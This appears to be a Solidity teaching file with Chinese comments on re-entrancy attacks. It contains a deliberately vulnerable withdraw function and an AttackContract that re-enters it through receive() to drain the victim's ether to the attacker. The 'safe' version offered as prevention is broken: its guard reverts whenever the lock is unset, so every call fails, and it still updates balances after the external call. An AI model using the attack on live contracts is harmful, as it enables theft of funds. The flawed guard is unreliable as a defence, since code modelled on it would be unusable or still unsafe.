// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*

Re-Entrancy攻击过程
Re-Entrancy攻击的过程通常包括以下几个步骤：

存款：攻击者先向受害合约存入一定数量的以太币，以便有余额可以提现。
触发提现函数：攻击者调用受害合约的提现函数，要求提取存入的以太币。
重入调用：在受害合约发送以太币之前，攻击者的合约通过fallback或receive函数再次调用受害合约的提现函数。
多次调用：每次重入调用都会重复触发提现逻辑，而受害合约的状态更新（如余额减少）却没有及时完成，从而导致多次提现。

*/
contract VulnerableContract {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount);
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success);
        balances[msg.sender] -= _amount;
    }
}

contract AttackContract {
    VulnerableContract public vulnerable;
    address public owner;

    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableContract(_vulnerableAddress);
        owner = msg.sender;
    }

    function attack() public payable {
        vulnerable.deposit{value: msg.value}();
        vulnerable.withdraw(msg.value);
    }

    receive() external payable {
        if (address(vulnerable).balance >= msg.value) {
            vulnerable.withdraw(msg.value);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}

/*
如何预防
确保在调用外部协定之前发生所有状态更改
使用防止重入的函数修饰符
*/

contract ReEntrancyGuard{
    error ReEntrancy(string);
    bool internal  lock;
    modifier noReentrant(){
        if(!lock){
            revert ReEntrancy("No re-entrancy");
        }
        lock = true;
        _;
        lock = false;
    }
}

contract SafeContract is ReEntrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable noReentrant {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 _amount) public noReentrant {
        require(balances[msg.sender] >= _amount);
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success);
        balances[msg.sender] -= _amount;
    }
}